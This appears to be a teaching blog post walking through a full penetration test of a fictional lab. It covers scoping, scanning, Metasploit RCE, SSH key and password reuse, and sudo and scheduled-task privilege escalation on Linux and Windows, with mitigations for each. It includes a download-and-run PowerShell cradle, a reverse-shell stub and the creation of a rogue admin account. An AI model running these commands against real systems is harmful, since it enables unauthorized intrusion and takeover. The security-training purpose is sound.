+++  
title = "Penetration Testing in a Nutshell: A Full Lifecycle Walkthrough"  
date = 2026-02-19T00:00:00Z  
draft = false  
description = "A practitioner's walkthrough of the full penetration testing lifecycleâ€”from pre-engagement paperwork to root shell and final report. Built around two real targets: a Linux WordPress server and a Windows Server 2019 host."  
tags = ["Penetration Testing", "Cybersecurity", "Ethical Hacking", "Methodology", "OSINT", "Enumeration", "Privilege Escalation", "Reporting", "Red Teaming", "InfoSec"]  
+++

---

## Introduction

Most penetration testing guides either go too shallow â€” recycling the same five Nmap flags â€” or too deep, burying you in theory before you've touched a single port. This walkthrough sits in between: a complete, phase-by-phase breakdown of a real engagement, from the first signed NDA to the final root shell.

We're working two targets in a fictional lab:

- **Linux Target** â€” Ubuntu web server running WordPress
- **Windows Target** â€” Windows Server 2019 hosting a self-managed Git service with SMB shares

Starting conditions: assumed breach on the Windows side (low-privileged domain user credentials provided), no foothold yet on Linux. Testing type: grey box. Both hosts are RFC 1918 addresses (`192.168.x.x / 10.x.x.x`).

The methodology follows PTES and OWASP standards. Everything here applies equally to cert prep and production engagements. Let's get into it.

---

## Phase 1 â€” Pre-Engagement

The engagement doesn't start when you fire up Nmap. It starts here â€” with paperwork, boundaries, and a clean workspace. Skip this phase and you're not a penetration tester; you're just an unauthorized attacker with good intentions.

### Scope Definition

**Objective:** Establish legal protection, define testing boundaries, and align expectations before a single packet is sent.

**Key documents:** NDA, Scoping Questionnaire, Scoping Document, Authorization Letter.

#### Scope Questionnaire â€” Two-Host Assessment

**Legal & Authorization**

| Question | Status |
|---|---|
| NDA signed by both parties? | Yes â€” standard for engagement |
| Written authorization received? | Yes â€” from client/team lead |
| Rules of Engagement agreed upon? | Yes â€” reviewed and signed |
| Data handling policies defined? | Yes â€” encrypted storage, team-only access, destroyed post-report |
| Findings shared internally or externally? | Internal team only |

**Target Identification**

| Question | Status |
|---|---|
| Total systems in scope | 2 â€” Linux web server + Windows domain host |
| IP ranges/hostnames provided? | Yes â€” both IPs confirmed |
| Cloud assets in scope? | N/A |
| Third-party services in scope? | N/A |
| APIs or mobile apps in scope? | N/A |

**Access & Credentials**

| Question | Status |
|---|---|
| Credentials provided? | Yes â€” assumed breach for Windows host |
| Access type | Low-privileged domain user (Windows); no initial access (Linux) |
| VPN or jump-box required? | N/A |
| MFA involved? | N/A |

**Testing Methodology**

| Question | Status |
|---|---|
| Test type | Grey box |
| Social engineering permitted? | No |
| Phishing simulation in scope? | No |
| DoS/DDoS permitted? | No â€” explicitly prohibited |
| Tools prohibited? | No â€” standard toolkit approved |

**Reporting & Deliverables**

| Question | Status |
|---|---|
| Report format | Markdown/PDF with screenshots and remediation steps |
| Language | English |
| Report recipient | Team lead/client |
| Remediation guidance included? | Yes |
| Executive summary required? | No â€” technical report only |

> **Scope Summary:** NDA and authorization confirmed. Two hosts in scope: Linux web server (no initial access) and Windows domain host (low-privileged credentials provided). Grey box methodology. Goals: enumerate privilege escalation paths, assess web application vulnerabilities, document findings. Deliverable: technical findings report with remediation.

---

### Rules of Engagement (RoE)

**Objective:** Lock down what's permitted, how communication flows, and what happens when things go sideways.

**RoE Checklist:**

- [x] Systems in scope clearly defined â€” Linux web server + Windows domain host
- [x] Testing timeframe agreed â€” flexible, no fixed hours
- [x] Prohibited methods listed â€” DoS, destructive payloads, service disruption
- [x] Emergency contacts documented â€” team lead / client POC
- [x] Communication channels set â€” email for updates, phone for critical findings
- [x] Objectives clarified â€” validate web app security and internal resilience from low-priv starting point
- [x] Evidence handling defined â€” encrypted storage, destroyed post-delivery
- [x] Written authorization confirmed
- [x] Third-party coordination â€” N/A (internal lab)

---

### Agreement & Environment Preparation

**Legal layer:**
- NDA signed and archived
- Written permission to test received  
- Contact matrix defined (tester â†” lead/client)

**Scope & Rules layer:**
- Scoping questionnaire completed
- RoE reviewed and signed
- Timeline locked: prep â†’ test â†’ report

**Environment:**

```
/engagement
  /logs         â† all tool output, timestamped
  /screenshots  â† every critical finding captured
  /notes        â† running narrative per phase
  /tools        â† custom scripts and configs
```

- Clean VM deployed â€” fresh snapshot, no residual artefacts
- Host isolation confirmed (VPN segmentation or host-only networking)
- Encryption and backup protocols active

---

## Phase 2 â€” Information Gathering

Legal foundations locked. Now we build the map. Information Gathering runs two parallel tracks: external (OSINT) and internal (network scanning). Both feed the same outcome â€” a prioritized attack surface.

### Track 1: OSINT

**Objective:** Use public data to understand the target's external footprint before touching their infrastructure.

**Tools:** Google Dorks, LinkedIn, GitHub, job boards, breach databases, passive DNS.

#### Manual Reconnaissance

```bash
# Google Dorking
site:target.com filetype:pdf
inurl:login site:target.com
intitle:"index of" site:target.com
ext:php site:target.com
intext:"sql syntax near" site:target.com
```

LinkedIn is a gold mine for tech stack inference. Job titles tell you everything:

- "DevOps Engineer â€” AWS" â†’ cloud provider confirmed
- "Kubernetes Administrator" â†’ container orchestration in play
- "Windows Systems Administrator" â†’ Active Directory environment likely

#### Automated Tooling

```bash
# GitHub secrets detection
truffleHog --repo https://github.com/target/repo.git
gitleaks detect --source /path/to/repo

# Passive DNS and IP intelligence
# bgp.he.net     â†’ ASN/IP ranges
# ViewDNS.info   â†’ DNS history
# SecurityTrails â†’ Subdomain discovery
```

#### What OSINT Feeds Into

- Exposed API keys in commit history â†’ direct cloud pivot
- Tech stack from job posts â†’ targeted CVE selection
- Breach data â†’ credential stuffing against login portals, VPNs, OWA

> **OSINT Finding (Example):** Exposed credentials discovered in public GitHub commit history. AWS keys present. Recommended immediate action: rotate secrets, implement secrets scanning in CI/CD pipeline, monitor breach databases for further exposure.

**Rules of thumb:**
- Historical commits contain more secrets than current code. Always go back.
- Job posts + tech stack + breach data = complete attack surface picture.
- OSINT findings directly inform every phase that follows. Document everything.

---

### Track 2: Network and Service Scanning

**Objective:** Identify live hosts, open ports, and exposed services within authorized scope.

**Tools:** Nmap, masscan, netexec, service-specific NSE scripts.

#### Scan Strategy â€” Start Broad, Go Deep

Never run one loud scan when progressive scanning gives you more:

```bash
# Step 1: Host discovery
nmap -sn 10.x.x.0/24 -oA ping-sweep

# Step 2: Quick top-1000 port scan
nmap -T4 -F 10.x.x.10 10.x.x.20 -oA quick-scan

# Step 3: Full port scan with version detection
nmap -sV -sC -p- 10.x.x.10 10.x.x.20 -oA full-version-scan

# Step 4: UDP (the forgotten attack surface)
nmap -sU --top-ports 20 10.x.x.10 10.x.x.20 -oA udp-scan

# Step 5: OS detection
nmap -O --traceroute 10.x.x.10 10.x.x.20 -oA os-detection
```

#### Scan Results

```
Host: 10.x.x.10 â€” Linux Web Server
  21/tcp  open  ftp    ProFTPD 1.3.5e
  22/tcp  open  ssh    OpenSSH 8.9p1 Ubuntu
  80/tcp  open  http   nginx 1.18.0
  443/tcp open  https  Apache httpd 2.4.52
  8000, 8001, 8080, 8889 â†’ Go language services
  3306/tcp filtered â†’ possible MySQL
  OS: Linux 5.4-5.15 (Ubuntu 20.04/22.04)

Host: 10.x.x.20 â€” Windows Domain Host
  22/tcp   open  ssh   OpenSSH for Windows 9.5
  445/tcp  open  smb   Windows Server 2019 Standard 17763
  3000/tcp open  http  Go net/http (Git service)
  3389/tcp open  rdp   Terminal Services
  5985/tcp open  http  WinRM
  53, 88, 389/tcp filtered â†’ DNS, Kerberos, LDAP (AD indicators)
  OS: Windows Server 2019
```

#### Targeted Service Deep-Dive

```bash
# SMB enumeration
nmap --script smb-enum-shares,smb-os-discovery -p445 10.x.x.20

# FTP anonymous access check
nmap --script ftp-anon -p21 10.x.x.10

# Web server fingerprinting
whatweb http://10.x.x.10
whatweb https://10.x.x.10

# TLS analysis
sslscan 10.x.x.10:443
nmap --script ssl-enum-ciphers -p443 10.x.x.10
```

#### Initial Attack Surface Map

| Service | Host | Priority Attack Vector |
|---|---|---|
| FTP 21 | Linux | Anonymous login? Known ProFTPD exploits? |
| SMB 445 | Windows | SMBv1? Null sessions? Signing disabled? |
| RDP 3389 | Windows | Credential brute-force, known exploits |
| WinRM 5985 | Windows | Credential brute-force if user list obtained |
| HTTP/HTTPS | Linux | Directory busting, LFI, SQLi |
| Git service 3000 | Windows | Version-specific CVE, API fuzzing |
| SSH 22 | Both | Weak credentials, version-specific exploits |

> **Scan Summary:** 2 active hosts, 20+ exposed services. Linux host runs ProFTPD 1.3.5e â€” known RCE path. Windows host exposes SMB, RDP, WinRM, and an outdated Git service. Custom Go services on non-standard ports add additional attack surface. Prioritize FTP and SMB enumeration next.

---

## Phase 3 â€” Vulnerability Assessment

Data is in. Now we filter signal from noise and identify the fastest paths to access. This phase is about prioritization â€” hit the easy wins first, then work the complex chains.

### Identifying Low-Hanging Fruit

#### Linux Target (10.x.x.10)

```bash
sudo nmap -p21,22,443 -sV -sC 10.x.x.10
```

**Findings:**

- **FTP (21):** ProFTPD â€” anonymous login allowed. File `WordPress_Setup_Notes.txt` present. Owned by user `john`.
- **SSH (22):** OpenSSH 8.9p1 â€” current, no quick CVE
- **HTTPS (443):** WordPress 6.7.2, domain `example.local`, sample page active

#### Windows Target (10.x.x.20)

```bash
sudo nmap -p- -sV -sC 10.x.x.20 -T5 -Pn
```

**Findings:**

- **OS:** Windows Server 2019 Standard (build 17763), hostname `SRV-WIN01`
- **SMB (445):** Message signing **disabled**, SMBv1 **enabled** â€” relay attack candidate
- **RDP (3389):** Exposed
- **Git Service (3000):** v1.12.4 (outdated), cookies and headers exposed, app name "Company Git"

#### Vulnerability Priority Map

| Vector | Host | Risk | Action |
|---|---|---|---|
| FTP anonymous access | Linux | ðŸ”´ HIGH | Download files, inspect for creds |
| WordPress plugin CVE | Linux | ðŸ”´ HIGH | Enumerate plugins, check versions |
| SMBv1 + signing disabled | Windows | ðŸ”´ HIGH | Null session, relay attack |
| Git service v1.12.4 | Windows | ðŸŸ¡ MEDIUM | Compare to patched version, CVE lookup |
| RDP exposed | Windows | ðŸŸ¡ MEDIUM | Credential testing once user list obtained |

> **Assessment Summary:** FTP anonymous access and WordPress plugin vulnerability represent the fastest paths into the Linux host. SMBv1 with signing disabled and an outdated Git service are the priority vectors on Windows. Enumerate before exploiting.

---

## Phase 4 â€” Linux Target: Exploitation & Privilege Escalation

### Linux Information Gathering

#### FTP Enumeration

FTP is cleartext. Any credential or file transmitted here is already compromised.

```bash
ftp 10.x.x.10 21
# Login: anonymous / anonymous
```

**What we found:**

```bash
ftp> ls -al
# Reveals john's home directory

ftp> get WordPress_Setup_Notes.txt
ftp> get .bash_history
ftp> cd .ssh
ftp> get id_rsa
ftp> get id_rsa.pub
```

**File analysis:**

`WordPress_Setup_Notes.txt` â€” confirms temporary FTP server, development context, developer name "John" from the dev team. Internal comms exposed.

`.bash_history` â€” contains this:

```bash
echo "john:[REDACTED]" | sudo chpasswd
```

Password change with credentials stored in shell history. Classic.

`id_rsa` â€” SSH private key with **no passphrase**. Ready to use.

#### WordPress Enumeration

```bash
wpscan --url https://10.x.x.10 -e p --disable-tls-checks --no-banner --plugins-detection passive -t 100
```

**Results:**
- Server: Apache/2.4.52 (Ubuntu)
- WordPress: 6.7.2
- XML-RPC: Enabled
- Theme: `twentytwentyfive` v1.0
- **Plugin: `custom-form-plugin` v1.1.0** â† target

**Vulnerability:**
- Type: Unauthenticated Arbitrary File Upload â†’ RCE
- Affected: versions â‰¤ 1.1.0
- Root cause: missing file type validation
- Target version: 1.1.0 â†’ **confirmed vulnerable**

#### Attack Vectors Identified â€” Linux

| Vector | Method | Complexity |
|---|---|---|
| SSH Password Auth | Credentials from `.bash_history` | Low |
| SSH Key Auth | Stolen `id_rsa` from FTP | Low |
| WordPress RCE | Unauthenticated file upload via Metasploit | Medium |

---

### Linux Initial Access

Three viable entry points. We test all three.

#### Vector 1: WordPress RCE via Metasploit

```bash
msfconsole -q
use exploit/multi/http/wp_plugin_rce
set rhosts 10.x.x.10
set rport 443
set ssl true
set lhost 10.x.x.x
set lport 4444
exploit
```

Exploitation chain: reverse handler â†’ vulnerability confirmed â†’ payload uploaded â†’ payload triggered â†’ Meterpreter session.

```bash
sysinfo     # Linux ubuntu 5.15.0-generic
shell
id          # uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
```

Access obtained as `www-data`. Limited but in.

#### Vector 2: SSH Private Key

```bash
ssh -i id_rsa john@10.x.x.10
```

No passphrase, direct `john` shell. OS: Ubuntu 22.04.4 LTS, kernel 5.15.0, 150+ pending updates.

#### Vector 3: SSH Password

```bash
ssh john@10.x.x.10
# Password: [REDACTED from .bash_history]
```

Valid. Credentials still active.

#### Initial Access Summary

| Method | Vector | Access Level |
|---|---|---|
| WordPress RCE | Vulnerable plugin exploit | `www-data` |
| SSH Private Key | Exposed key via FTP | `john` |
| SSH Password | Credentials from shell history | `john` |

Root cause: a single misconfigured FTP service exposed SSH keys, shell history with plaintext credentials, and internal documentation â€” three distinct attack paths from one finding.

---

### Linux Post-Exploitation Enumeration

The most common mistake after landing a shell is rushing straight to privilege escalation. Enumerate first. You can't escalate what you don't understand.

**Collect before exploiting:**

1. OS version and kernel â€” patch level
2. Current user context â€” privileges and group memberships
3. Network interfaces, routes, active connections
4. Running processes and listening ports
5. File system â€” SUID/SGID binaries, writable directories, cron jobs
6. Installed software versions
7. Security mechanisms â€” firewall, SELinux, AppArmor

#### Automated Enumeration with LinPEAS

```bash
# On attacker machine
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
scp -i id_rsa ./linpeas.sh john@10.x.x.10:/home/john/

# On target
bash linpeas.sh -a -N > linpeas_results.txt

# Retrieve
scp -i id_rsa john@10.x.x.10:/home/john/linpeas_results.txt ./
```

LinPEAS colour logic:
- ðŸ”´ **Red** â€” high-probability escalation vector
- ðŸŸ¡ **Yellow** â€” worth manual analysis
- ðŸŸ¢ **Green** â€” general enumeration data

#### Key Findings

```bash
OS: Linux version 5.15.0-generic (Ubuntu 22.04.4 LTS)
User: uid=1000(john) gid=1000(john) groups=1000(john),27(sudo)
```

**Sudo rights:**

```bash
sudo -l

User john may run:
    (root) NOPASSWD: /usr/bin/nano
    (ALL : ALL) ALL
```

Two paths here â€” one without a password. Also note:

```bash
uid=33(www-data) gid=33(www-data) groups=33(www-data),1000(john)
```

`www-data` is in `john`'s group. The web server process can read `john`'s files.

#### Vulnerability Assessment Summary

| Vector | Risk | Notes |
|---|---|---|
| `sudo nano` (NOPASSWD) | ðŸ”´ HIGH | Text editor with shell escape, no password required |
| Full sudo (password) | ðŸŸ¡ MEDIUM | Requires `john`'s password â€” already obtained |
| Group misconfiguration | ðŸŸ¡ MEDIUM | `www-data` in `john`'s group â€” information disclosure |

---

### Linux Privilege Escalation

Two methods. Method 1 doesn't require a password.

#### Method 1: GTFOBins â€” Nano Shell Escape

```bash
sudo /usr/bin/nano
# Press CTRL+R then CTRL+X
# At the command prompt:
reset; /bin/bash 1>&0 2>&0
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root. No password required.

#### Method 2: Direct Sudo (Password Known)

```bash
sudo su
# or
sudo bash
# Password: [REDACTED â€” already obtained from .bash_history]
```

#### Mitigation

Remove the passwordless nano entry:

```bash
visudo
# Remove: john ALL=(root) NOPASSWD: /usr/bin/nano
```

Fix group membership:

```bash
sudo gpasswd -d www-data john
```

Long-term: implement principle of least privilege, audit sudo configurations quarterly, monitor sudo usage via auditd.

---

## Phase 5 â€” Windows Target: Exploitation & Privilege Escalation

### Windows Information Gathering

```bash
sudo nmap -p- -sV -sC 10.x.x.20 -T5 -Pn
```

| Port | Service | Version |
|---|---|---|
| 22/tcp | SSH | OpenSSH for Windows 9.5 |
| 135/tcp | MSRPC | Microsoft Windows RPC |
| 139/tcp | NetBIOS-SSN | Microsoft Windows |
| 445/tcp | SMB | Windows Server 2019 |
| 3000/tcp | HTTP | Go net/http (Git service) |
| 3389/tcp | RDP | Terminal Services |
| 5985/5986/tcp | WinRM | PowerShell Remoting |

**System:** Windows Server 2019 Standard, hostname `SRV-WIN01`, workgroup `WORKGROUP`

**Red flags:** SMB signing disabled, SMBv1 enabled, SSH present (unusual on Windows).

#### Git Service (Port 3000)

- Application: Self-hosted Git v1.12.4
- Backend: Go 1.14.8
- Patched version: 1.13.0+
- **Status: Outdated and vulnerable**

#### SMB Analysis

```bash
netexec smb 10.x.x.20
```

```
SMB 10.x.x.20 445 SRV-WIN01 [*] Windows Server 2019 Standard 17763 x64 (signing:False) (SMBv1:True)
```

```bash
# Share enumeration via guest account
netexec smb 10.x.x.20 -u guest -p '' --shares
```

Discovered shares: `ADMIN$`, `C$`, `Data`, `IPC$`

Custom `Data` share â€” worth investigating.

---

### Windows Initial Access

We have `john`'s credentials from the Linux target. Password reuse is the most common real-world finding. Test it first.

#### SMB â€” Password Reuse

```bash
netexec smb 10.x.x.20 -u "john" -p '[REDACTED]' --shares
```

Result: credentials valid, read access to `Data` share, `backup_script.ps1` found.

```bash
netexec smb 10.x.x.20 -u "john" -p '[REDACTED]' --share Data --get-file backup_script.ps1 backup_script.ps1
```

**Script contents:**

```powershell
$username = "SRV-WIN01\john"
$password = "[REDACTED]"
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
# ... file copy logic ...
```

Hardcoded credentials in a shared script. The Windows environment hands us the same credentials we already have â€” and confirms they're embedded in automation scripts accessible by any user with share read access.

#### RDP Access

```bash
xfreerdp /u:john /p:"[REDACTED]" /v:10.x.x.20
```

Successful session as `SRV-WIN01\john`.

#### Git Service RCE

```bash
msfconsole -q
use exploit/multi/http/git_hooks_rce
set RHOSTS 10.x.x.20
set RPORT 3000
set USERNAME john
set PASSWORD [REDACTED]
set LHOST 10.x.x.x
set LPORT 4444
exploit
```

Meterpreter session established. Git Hook RCE â€” patched in 1.13.0, we're hitting 1.12.4.

#### Initial Access Summary

| Vector | Method | Access |
|---|---|---|
| SMB | Password reuse from Linux | File system read, `Data` share |
| RDP | Valid credentials | Interactive desktop as `john` |
| Git RCE | Version CVE via Metasploit | System command execution |

---

### Windows Post-Exploitation Enumeration

#### User Privileges

```powershell
whoami /priv
```

| Privilege | State | Impact |
|---|---|---|
| SeImpersonatePrivilege | Enabled | ðŸ”´ HIGH â€” token impersonation attacks |
| SeChangeNotifyPrivilege | Enabled | Limited |

Group memberships: `Event Log Readers`, `Remote Desktop Users`, `Users` â€” no admin, but `SeImpersonatePrivilege` is a viable escalation path.

#### Scheduled Tasks

```powershell
schtasks /query /fo LIST /v
```

```
TaskName:     \BackupAgent
Run As User:  Administrator
Task To Run:  powershell.exe -File C:\ProgramData\Backup\Scripts\backup_prep.ps1
Schedule:     Every 2 minutes
```

A script running as Administrator every two minutes. Now we check who can write to it.

#### WinPEAS

```bash
# Attacker
wget https://raw.githubusercontent.com/peass-ng/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
python3 -m http.server 8080

# Target
powershell "IEX(New-Object Net.WebClient).downloadString('http://10.x.x.x:8080/winPEAS.ps1')" > winpeas.txt
```

**Critical finding:**

```
BUILTIN\Users has 'Write' perms for C:\ProgramData
```

`john` can write to the directory containing the Administrator's scheduled script.

#### Privilege Escalation Vectors

| Vector | Risk | Notes |
|---|---|---|
| SeImpersonatePrivilege | ðŸ”´ HIGH | Token impersonation (PrintSpoofer, GodPotato) |
| Writable `C:\ProgramData` | ðŸ”´ HIGH | DLL hijacking or script modification |
| BackupAgent scheduled task | ðŸ”´ HIGH | Runs as Administrator, user-writable script |

---

### Windows Privilege Escalation

The path of least resistance: modify the script that runs as Administrator.

#### Step-by-Step

**Step 1:** Verify write access

```powershell
Get-Acl "C:\ProgramData\Backup\Scripts\backup_prep.ps1" | Format-List
```

**Step 2:** Add escalation payload to script

```powershell
Add-LocalGroupMember -Group "Administrators" -Member "SRV-WIN01\john"
```

**Step 3:** Wait. Task runs every 2 minutes.

**Step 4:** Verify

```powershell
net user john
```

`john` is now in the `Administrators` group.

#### Alternative Methods

Reverse shell option:

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.x.x.x', 4444)
# ... reverse shell payload ...
```

Create a separate admin account:

```powershell
net user tempuser Password123! /add
net localgroup administrators tempuser /add
```

#### Full Attack Chain â€” Windows

1. Initial access via Git Hook RCE (v1.12.4)
2. Enumerated `SeImpersonatePrivilege` and writable `C:\ProgramData`
3. Discovered `BackupAgent` task running as Administrator with user-writable script
4. Injected `Add-LocalGroupMember` into `backup_prep.ps1`
5. Task executed â†’ `john` added to Administrators
6. Full admin access confirmed

#### Mitigation

```powershell
# Remove write permissions immediately
icacls "C:\ProgramData\Backup\Scripts\backup_prep.ps1" /remove "BUILTIN\Users"
```

Long-term: run scheduled tasks with least-privilege service accounts, enforce script signing, implement file integrity monitoring on `C:\ProgramData`, audit scheduled tasks for over-privileged execution contexts.

---

### Windows Pillaging

With admin access locked in, we run post-exploitation data collection.

**Tooling:** `WinPill.ps1` or manual enumeration â€” captures system info, autoruns, scheduled tasks, user configuration, network state, event logs, and sensitive files.

**Critical find:**

```
C:\Users\Administrator\customer_data.csv
```

Contains: customer IDs, names, emails, phone numbers, physical addresses, dates of birth, SSNs, credit card numbers, expiry dates, CVV codes.

#### Regulatory Exposure

| Regulation | Exposure |
|---|---|
| GDPR | Up to â‚¬20 million or 4% of global annual turnover |
| CCPA | $2,500â€“$7,500 per violation |
| PCI DSS | Card data exposure â€” immediate compliance failure |

This is no longer just a technical finding. A single unencrypted CSV in an Administrator's home directory turns a privilege escalation into a regulatory event.

**Mitigations:** Encrypt sensitive data at rest, implement DLP, restrict file access to business-need-only, classify data formally, enable file access monitoring.

---

## Phase 6 â€” Proof-of-Concept & Documentation

A finding without evidence isn't a finding â€” it's a claim. The PoC is how you prove it happened, make it reproducible, and give the client something actionable.

### PoC Structure

For each finding:

1. **Information Gathering** â€” how the target was identified
2. **Vulnerability Assessment** â€” what was found and why it matters
3. **Exploitation** â€” step-by-step commands with output
4. **Local Enumeration** â€” what post-exploitation revealed
5. **Privilege Escalation** â€” the escalation path with evidence
6. **Pillaging** â€” data accessed or extractable

**Every step needs:**
- The exact command executed
- The output (screenshot or text capture)
- Context explaining why this matters

### Example PoC Entry â€” FTP Anonymous Access

```bash
# Step 1: Confirm anonymous FTP access
ftp 10.x.x.10 21
# Login: anonymous / anonymous
# Result: 230 Login successful

# Step 2: List directory contents
ls -al
# Reveals: WordPress_Setup_Notes.txt, .bash_history, .ssh/ directory

# Step 3: Extract sensitive files
get .bash_history
cd .ssh && get id_rsa

# Step 4: Confirm credential exposure
grep "chpasswd" .bash_history
# Output: echo "john:[REDACTED]" | sudo chpasswd

# Step 5: Use key for SSH access
ssh -i id_rsa john@10.x.x.10
# Result: Immediate shell as john â€” no passphrase required
```

**Finding severity:** Critical. A single misconfigured service provided credentials, a private key, and internal documentation â€” three independent paths to compromise.

### Report Structure

A professional pentest report contains:

1. Statement of Confidentiality
2. Engagement Contacts
3. Executive Summary (if required)
4. Assignment & Scope
5. Assessment Summary
6. Compromise Walkthrough â€” the PoC, phase by phase
7. Remediation Summary â€” prioritized, actionable, feasible

**Quality bar:** Technical accuracy (verifiable), clarity (readable by both engineers and decision-makers), actionability (specific fixes, not vague guidance).

---

## Phase 7 â€” Post-Engagement

### Reporting & Delivery

Deliver findings structured by severity:

- **Critical / High** â€” immediate action required
- **Medium** â€” schedule for next patch cycle
- **Low / Informational** â€” address in hardening review

Business impact framing matters for client buy-in. The `customer_data.csv` finding isn't just a "weak file permissions" issue â€” it's a potential â‚¬20M GDPR event and a PCI DSS compliance failure. Frame it accordingly.

### Remediation Planning

Work with the client's IT team to assess feasibility â€” the best remediation is one that gets implemented, not the theoretically perfect fix that never ships. Where quick wins exist (removing anonymous FTP access, rotating exposed credentials), drive those first. Structural fixes (data classification policy, secrets management in CI/CD, scheduled task privilege audits) go into the roadmap.

### Cleanup

- Remove all uploaded tools from target systems
- Delete any created accounts or modified scripts (or document those that require client action)
- Wipe local logs and screenshots after report delivery (per agreed data destruction policy)
- Confirm with client that all artefacts from the engagement are handled per RoE

---

## Final Thoughts

### The Attack Chain â€” Both Targets

**Linux:**  
Anonymous FTP â†’ shell history with plaintext creds + unprotected SSH key â†’ `john` shell â†’ `sudo nano` NOPASSWD â†’ root

**Windows:**  
Password reuse from Linux â†’ SMB access â†’ `backup_script.ps1` with hardcoded creds â†’ RDP + Git RCE â†’ writable scheduled task script â†’ `john` added to Administrators â†’ full admin access â†’ unencrypted PII on Administrator's desktop

Two hosts. Multiple critical findings on each. Every single one preventable with basic security hygiene.

### The Consistent Patterns

Across both targets, the same categories of failure appear:

- **Credential exposure** â€” shell history, hardcoded scripts, reused passwords across systems
- **Least privilege violations** â€” passwordless sudo for a text editor, user-writable Administrator scripts
- **Outdated software** â€” ProFTPD 1.3.5e, Git v1.12.4 â€” both with public exploits
- **Legacy protocol enablement** â€” SMBv1, anonymous FTP
- **Sensitive data protection** â€” plaintext PII in an accessible location

None of these required advanced techniques to exploit. The methodology surfaced them systematically.

---

## Reference

### Standards & Frameworks

- [PTES â€” Penetration Testing Execution Standard](http://www.pentest-standard.org/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [NIST SP 800-115](https://csrc.nist.gov/publications/detail/sp/800-115/final)
- [OSSTMM](https://www.isecom.org/OSSTMM.3.pdf)

### Core Toolkit

| Tool | Purpose |
|---|---|
| Nmap | Network scanning and service fingerprinting |
| Metasploit | Exploitation framework |
| Burp Suite | Web application testing |
| NetExec | SMB/WinRM/LDAP enumeration and credential validation |
| BloodHound | Active Directory attack path mapping |
| LinPEAS / WinPEAS | Automated privilege escalation enumeration |
| WPScan | WordPress-specific enumeration |
| TruffleHog / Gitleaks | Secrets detection in repositories |

### Practice Environments

- Hack The Box (HTB) â€” structured labs, Pro Labs for realistic enterprise scenarios
- TryHackMe â€” guided learning paths
- VulnHub â€” downloadable vulnerable VMs
- CTF competitions â€” technique reinforcement under time pressure

---
